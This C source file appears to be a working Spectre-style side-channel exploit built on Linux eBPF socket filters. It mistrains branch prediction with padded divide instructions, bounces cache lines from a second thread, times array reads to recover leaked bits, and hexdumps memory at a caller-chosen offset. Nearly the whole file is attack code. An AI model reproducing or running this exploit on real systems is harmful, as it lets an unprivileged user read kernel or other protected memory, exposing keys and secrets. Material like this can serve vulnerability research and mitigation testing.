#include <linux/bpf_common.h>
#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/time.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

int main_cpu, bounce_cpu;
void pin_task_to(int pid, int cpu) {
  cpu_set_t cset;
  CPU_ZERO(&cset);
  CPU_SET(cpu, &cset);
  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))
    err(1, "affinity");
}
void pin_to(int cpu) { pin_task_to(0, cpu); }

int cache_dump_proc;

/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_JMP_REG(OP, DST, SRC, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_X,      \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

#define BPF_TEST_INS(code_,dst_reg_,src_reg_,off_,imm_)                 \
  ((struct bpf_insn) {                          \
    .code  = code_,       \
    .dst_reg = dst_reg_,                             \
    .src_reg = src_reg_,                               \
    .off   = off_,                                 \
    .imm   = imm_ })


int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 4,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  //printf("==========================\n%s==========================\n", verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);
  printf("Created BPF Prog, FD: %d\n",progfd);
  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

int prog_array_create() {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_PROG_ARRAY,
      .key_size = 4,
      .value_size = 4,
      .max_entries = 32
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

/* assumes 32-bit values */
void array_set(int mapfd, uint32_t key, uint32_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem 32bit");
}

void array_set_2dw(int mapfd, uint32_t key, uint64_t value1, uint64_t value2) {
  uint64_t value[2] = { value1, value2 };
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem 2dw");
}

/* assumes 32-bit values */
uint32_t array_get(int mapfd, uint32_t key) {
  uint32_t value = 0;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };
  int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);
  if (res)
    err(1, "map lookup elem");
  return value;
}

struct array_timed_reader_prog {
  int control_array;
  int sockfd;
};

struct array_timed_reader_prog create_timed_reader_prog(int timed_array_fd) {
  struct array_timed_reader_prog ret;

  /*
   * slot 0: timed_array index
   * slot 1: measured time delta
   */
  ret.control_array = array_create(4, 2);

  struct bpf_insn insns[] = {
    // r8 = index (bounded to 0x5000)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0),
    BPF_JMP_IMM(BPF_JLT, BPF_REG_8, 0x5000, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // r7 = timed array pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, timed_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    /* get time; speculation barrier */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* do the actual load */
    BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),
    BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_7, 0),

    /*
     * get time delta; speculation barrier
     * r6 = ktime_get_ns() - r6
     */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* store time delta */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_6, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  return ret;
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

uint32_t perform_timed_read(struct array_timed_reader_prog *prog, int index) {
  array_set(prog->control_array, 0, index);
  array_set(prog->control_array, 1, 0x13371337); /* poison, for error detection */
  trigger_proc(prog->sockfd);
  uint32_t res = array_get(prog->control_array, 1);
  if (res == 0x13371337)
    errx(1, "got poison back after timed read, eBPF code is borked");
  return res;
}
unsigned int hot_cold_limit;


int bounce_sock_fd = -1;

void load_bounce_prog(int target_array_fd) {
  struct bpf_insn insns[] = {
    // r7 = timed array pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, target_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),

    BPF_ST_MEM(BPF_W, BPF_REG_0, 0x1200, 1),
    BPF_ST_MEM(BPF_W, BPF_REG_0, 0x2000, 1),
    BPF_ST_MEM(BPF_W, BPF_REG_0, 0x3000, 1),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  bounce_sock_fd = create_filtered_socket_fd(insns, ARRSIZE(insns));
}

// 1 means "bounce it", -1 means "exit now"
volatile int cacheline_bounce_status;
int cacheline_bounce_fds[2];
void *cacheline_bounce_worker(void *arg) {
  pin_to(bounce_cpu);

  while (1) {
    __sync_synchronize();
    int cacheline_bounce_status_copy;
    while ((cacheline_bounce_status_copy = cacheline_bounce_status) == 0) /* loop */;
    if (cacheline_bounce_status_copy == -1)
      return NULL;
    __sync_synchronize();
    trigger_proc(bounce_sock_fd);
    __sync_synchronize();
    cacheline_bounce_status = 0;
    __sync_synchronize();
  }
}

void bounce_cachelines(void) {
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}

pthread_t cacheline_bounce_thread;
pthread_t poison_branch_predict[10];

void cacheline_bounce_worker_enable(void) {
  cacheline_bounce_status = 0;
  if (pthread_create(&cacheline_bounce_thread, NULL, cacheline_bounce_worker, NULL))
    errx(1, "pthread_create");
}
void cacheline_bounce_worker_disable(void) {
  cacheline_bounce_status = -1;
  if (pthread_join(cacheline_bounce_thread, NULL))
    errx(1, "pthread_join");
}




int bpf_create_cache_dump_prog(int tail_call_fd, int tail_call_idx){
  struct bpf_insn cache_dump_1[1+0x700+8];
  unsigned int post_offset = 1+0x700;
  memset(&cache_dump_1, 0, sizeof(cache_dump_1));
  cache_dump_1[0] = BPF_MOV64_IMM(BPF_REG_2, 0x1);
  for (int i = 0; i < 0x700; ++i)
  {
    cache_dump_1[1+i]= BPF_JMP_IMM(BPF_JEQ, BPF_REG_2, 0x0, 0);
  }
  cache_dump_1[post_offset+0] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[post_offset+1] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[post_offset+2] = BPF_LD_MAP_FD(BPF_REG_2, tail_call_fd);
  cache_dump_1[post_offset+4] = BPF_MOV64_IMM(BPF_REG_3, tail_call_idx);
  cache_dump_1[post_offset+5] = BPF_EMIT_CALL(BPF_FUNC_tail_call);
  cache_dump_1[post_offset+6] = BPF_MOV64_IMM(BPF_REG_0, 0);
  cache_dump_1[post_offset+7] = BPF_EXIT_INSN();

  return create_filtered_socket_fd(cache_dump_1, ARRSIZE(cache_dump_1));
}

int bpf_create_tail_calls(int tail_call_fd, int tail_call_idx){
  struct bpf_insn cache_dump_1[1+0x700+8];
  unsigned int post_offset = 1+0x700;
  memset(&cache_dump_1, 0, sizeof(cache_dump_1));
  cache_dump_1[0] = BPF_MOV64_IMM(BPF_REG_2, 0x1);
  for (int i = 0; i < 0x700; ++i)
  {
    cache_dump_1[1+i]= BPF_JMP_IMM(BPF_JEQ, BPF_REG_2, 0x0, 0);
  }
  cache_dump_1[post_offset+0] = BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP);
  cache_dump_1[post_offset+1] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8);
  cache_dump_1[post_offset+2] = BPF_LD_MAP_FD(BPF_REG_2, tail_call_fd);
  cache_dump_1[post_offset+4] = BPF_MOV64_IMM(BPF_REG_3, tail_call_idx);
  cache_dump_1[post_offset+5] = BPF_EMIT_CALL(BPF_FUNC_tail_call);
  cache_dump_1[post_offset+6] = BPF_MOV64_IMM(BPF_REG_0, 0);
  cache_dump_1[post_offset+7] = BPF_EXIT_INSN();

  return prog_load(cache_dump_1, ARRSIZE(cache_dump_1));
}

int create_trash_cache_progs(){
  int sockfd,progfd; 
  int prog_array = prog_array_create();
  sockfd = bpf_create_cache_dump_prog(prog_array,0);
  for (int i = 1; i < 32; ++i)
  {
    progfd = bpf_create_tail_calls(prog_array,i);
    array_set(prog_array, i-1, progfd);
  }
  return sockfd;
}

void* run_trash_cache_progs(){
  pin_to(main_cpu+4);
  int fd = create_trash_cache_progs();
  while (1) {
    trigger_proc(fd);
  }
}




struct mem_leaker_prog {
  int data_map;
  int control_map; // [bitshift, index]
  int sockfd;
};

struct mem_leaker_prog load_mem_leaker_prog(void) {
  struct mem_leaker_prog ret;

  ret.data_map = array_create(0x5000, 1);
  ret.control_map = array_create(16, 1);

  struct bpf_insn insns[] = {
	#define BPF_REG_CONTROL_PTR BPF_REG_7
	#define BPF_REG_MAP_PTR BPF_REG_0
	#define BPF_REG_BITSHIFT BPF_REG_1
	#define BPF_REG_INDEX BPF_REG_2
	#define BPF_REG_SLOW_BOUND BPF_REG_3
	#define BPF_REG_OOB_ADDRESS BPF_REG_4
	#define BPF_REG_LEAKED_BYTE BPF_REG_4
	#define BPF_REG_DUMMY1 BPF_REG_8
	#define BPF_REG_DUMMY2 BPF_REG_9


    // load control data
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0x7ff),
    BPF_MOV64_REG(BPF_REG_CONTROL_PTR, BPF_REG_0),

    // load pointer to our big array
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0x7ff),

  
    BPF_MOV64_IMM(BPF_REG_DUMMY1, -1),
    BPF_MOV64_IMM(BPF_REG_DUMMY2, -3),
    //nothing special until here
    // load bitshift and speculatively unbounded index
    BPF_LDX_MEM(BPF_DW, BPF_REG_INDEX, BPF_REG_CONTROL_PTR, 8),
    BPF_LDX_MEM(BPF_DW, BPF_REG_BITSHIFT, BPF_REG_CONTROL_PTR, 0),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_BITSHIFT, 0xf),
    
    BPF_MOV64_IMM(BPF_REG_5, 1),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_INDEX, 0, 1),               
    BPF_MOV64_IMM(BPF_REG_5, 0),
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_5, 0),       //verifer lost track not sure if this is neccessary
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_5, 0),
    
    BPF_MOV64_REG(BPF_REG_OOB_ADDRESS,BPF_REG_INDEX),         //poison pointer   r5=0 and we attack
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 0, 1), 
    BPF_MOV64_REG(BPF_REG_OOB_ADDRESS, BPF_REG_MAP_PTR),

#define BRANCH_PREDICT BPF_ALU64_REG(BPF_DIV, BPF_REG_DUMMY1, BPF_REG_DUMMY2), //BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 1, 0),
//#define BRANCH_PREDICT BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 1, 0),BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 1, 0),BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 1, 0),
                 
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT          
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT      
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT   
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT   
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                     
    BRANCH_PREDICT                  
    
	BPF_LDX_MEM(BPF_DW, BPF_REG_SLOW_BOUND, BPF_REG_MAP_PTR, 0x1200),     //// load verifier-bounded slowly-loaded  
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_BOUND, 1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_BOUND, 2),  
    BPF_ALU64_REG(BPF_ADD, BPF_REG_5, BPF_REG_SLOW_BOUND),
    BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 0, 0x7ff),               // branch to misstrain, otherwise never gets executed
    //BPF_LDX_MEM(BPF_B, BPF_REG_1, BPF_REG_MAP_PTR, 0x2000), //test speculation occurence
                                                              //if index!= this branch should be executed speculativly
                                                              //then BPF_REG_OOB_ADDRESS is overwritten by user register
                                                              //BPF_REG_INDEX
    BPF_LDX_MEM(BPF_B, BPF_REG_LEAKED_BYTE, BPF_REG_OOB_ADDRESS, 0),
    BPF_ALU64_REG(BPF_LSH, BPF_REG_LEAKED_BYTE, BPF_REG_BITSHIFT),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_LEAKED_BYTE, 0x1000),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_MAP_PTR, BPF_REG_LEAKED_BYTE),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_MAP_PTR, 0x2000),
    BPF_LDX_MEM(BPF_B, BPF_REG_1, BPF_REG_MAP_PTR, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  int exit_idx = ARRSIZE(insns) - 2;
  for (int i=0; i<ARRSIZE(insns); i++) {
    if (BPF_CLASS(insns[i].code) == BPF_JMP && insns[i].off == 0x7ff) {
      printf("fixing up exit jump\n");
      insns[i].off = exit_idx - i - 1;
    }
  }
  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));

  return ret;
}

#define ABS(x) ((x)<0 ? -(x) : (x))

struct array_timed_reader_prog trprog;

int leak_bit_old(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
             unsigned long bit_index) {
  int votes = 0;
  for (int i=0; i<0xf; i++) {
    if ((i & 0x3) != 0x3) {
      array_set_2dw(leakprog->control_map, 0, 12-bit_index, 0); //misstrain branch predictor
    } else {
      array_set_2dw(leakprog->control_map, 0, 12-bit_index, byte_offset); 
      bounce_cachelines();
    }
    trigger_proc(leakprog->sockfd);


    if ((i & 0x3) != 0x3) {

    } else {
      int times[2];
      times[0] = perform_timed_read(&trprog, 0x2000);
      times[1] = perform_timed_read(&trprog, 0x3000);
      //printf("%u, %u\n", times[0],times[1]);
      if (times[0] < times[1]) votes--;
      if (times[0] > times[1]) votes++;
    }
  }

  if (votes < 0) return 0;
  if (votes > 0) return 1;
  return -1;
}


int leak_bit(struct mem_leaker_prog *leakprog, unsigned long byte_offset,
             unsigned long bit_index) {
  int count_0 = 0, count_1 = 0, t0,t1;
  uint64_t hitrate = 0;
  while ( (count_0 + count_1) < 10) {
      array_set_2dw(leakprog->control_map, 0, 12-bit_index, 0); 
      trigger_proc(leakprog->sockfd);
      array_set_2dw(leakprog->control_map, 0, 12-bit_index, byte_offset); 
      bounce_cachelines();
      trigger_proc(leakprog->sockfd);

      t1 = perform_timed_read(&trprog, 0x3000);
      t0 = perform_timed_read(&trprog, 0x2000);
      if (t0 < 25){
        printf("%u %u\n", t0, t1);
        count_0++;
      }
      if (t1 < 25){
        printf("%u %u\n", t0, t1);
        count_1++;
      }
      hitrate++;
    }
    printf("%d vs %d\n", count_0, count_1);
    printf("hitrate %f%%\n", 100*10.0/hitrate);
    return (count_0 > count_1) ? 0 : 1;
 }

int leak_byte_old(struct mem_leaker_prog *leakprog, unsigned long byte_offset) {
  int byte = 0;
  for (int pos = 0; pos < 8; pos++) {
    int bit = leak_bit_old(leakprog, byte_offset, pos);
    if (bit == -1) {
      return -1;
    }
    if (bit == 1) {
      byte |= (1<<pos);
    }
  }
  return byte;
}

int leak_byte(struct mem_leaker_prog *leakprog, unsigned long addr) {
  int value = 0;
  for (int bit=0; bit<8; bit++) {
    value |= leak_bit(leakprog, addr, bit)<<bit;
    printf("%04x: %02x\n", bit, value);
  }
  return value;
}

void hexdump_memory(struct mem_leaker_prog *leakprog,
        unsigned long byte_offset_start, unsigned long byte_count) {
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line, want multiple of 16");
  for (unsigned long dumped = 0; dumped < byte_count;
          dumped += 16) {
    unsigned long byte_offset = byte_offset_start + dumped;
    int bytes[16];
    for (int i=0; i<16; i++) {
      bytes[i] = leak_byte_old(leakprog, byte_offset + i);
    }
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%016lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        linep += sprintf(linep, "?? ");
      } else {
        linep += sprintf(linep, "%02hhx ", (unsigned char)bytes[i]);
      }
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      if (bytes[i] == -1) {
        *(linep++) = '?';
      } else {
        if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
          *(linep++) = bytes[i];
        } else {
          *(linep++) = '.';
        }
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int main(int argc, char **argv) {
  setbuf(stdout, NULL);

  if (argc != 5) {
    printf("invocation: %s <main-cpu> <bounce-cpu> <hex-offset> <hex-length>\n", argv[0]);
    exit(1);
  }
  main_cpu = atoi(argv[1]);
  bounce_cpu = atoi(argv[2]);
  unsigned long offset = strtoul(argv[3], NULL, 16);
  unsigned long length = strtoul(argv[4], NULL, 16);

  pin_to(main_cpu);

  struct mem_leaker_prog leakprog = load_mem_leaker_prog();
  getchar();
  trprog = create_timed_reader_prog(leakprog.data_map);
  load_bounce_prog(leakprog.data_map);
  cacheline_bounce_worker_enable();
  

  struct timespec start, end;
  clock_gettime(CLOCK_PROCESS_CPUTIME_ID,&start);
  hexdump_memory(&leakprog, offset, length);
  clock_gettime(CLOCK_PROCESS_CPUTIME_ID,&end);
  printf("Elapsed time: %ld nanosecons\n", end.tv_nsec - start.tv_nsec);
  return 0;
  for (int i=0; i<length; i++) {
    unsigned long addr = offset + i;
    unsigned char leaked = leak_byte(&leakprog, addr);
    printf("%016lx: 0x%02hhx ('%c')\n", addr, leaked, leaked);
  }
  
}
